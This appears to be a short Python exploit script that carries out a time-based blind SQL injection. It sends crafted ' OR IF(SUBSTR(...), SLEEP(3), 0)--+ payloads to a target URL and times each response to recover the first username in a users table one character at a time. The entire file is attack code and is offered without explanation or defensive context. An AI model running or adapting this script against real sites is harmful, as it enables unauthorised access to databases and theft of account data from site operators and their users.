import time
from utils.http_handler import send_payload

def extract_data(url):
    extracted = ""
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    for i in range(1, 20):  # extracting up to 20 characters
        for char in charset:
            payload = f"' OR IF(SUBSTR((SELECT username FROM users LIMIT 1),{i},1)='{char}', SLEEP(3), 0)--+"
            start = time.time()
            send_payload(url, payload)
            if time.time() - start > 2:
                extracted += char
                break
    return f"Extracted Username: {extracted}"